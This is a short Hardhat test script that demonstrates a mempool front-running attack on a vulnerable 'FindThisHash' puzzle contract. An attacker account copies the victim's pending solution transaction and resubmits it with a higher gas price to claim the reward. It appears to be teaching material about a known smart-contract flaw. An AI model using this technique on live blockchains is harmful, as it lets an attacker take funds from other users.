const { expect } = require("chai");
const { ethers } = require("hardhat");
it("Perform the Frontrunning Attack", async () => {
  let [alice, bob, eve_attacker] = await ethers.getSigners();
  const Vulnerable = await ethers.getContractFactory("FindThisHash");
  const vulnerable = await Vulnerable.connect(alice).deploy({
    value: hre.ethers.parseEther("10"),
  });
  await vulnerable.waitForDeployment();

  await vulnerable.connect(bob).solve("Ethereum");

  // getting all the txs in mempool
  const txs = await ethers.provider.send("eth_getBlockByNumber", [
    "pending",
    true,
  ]);
  const vulnerableAddr = await vulnerable.getAddress();
  let vulnerableTrx;
  // finding all the trx sent to contract
  vulnerableTrx = txs.transactions.find(
    (trx) => trx.to == vulnerableAddr.toString().toLowerCase()
  );

  // Frontrunning bob trx with more gas
  await eve_attacker.sendTransaction({
    to: vulnerableTrx.to,
    data: vulnerableTrx.input,
    gasPrice: BigNumber.from(vulnerableTrx.gasPrice).add(100),
    gasLimit: BigNumber.from(vulnerableTrx.gas).add(100000),
  });

  // Mine all the pending transactions
  await ethers.provider.send("evm_mine", []);

  expect(await vulnerable.winnerAddress()).to.eq(eve_attacker.address);
});
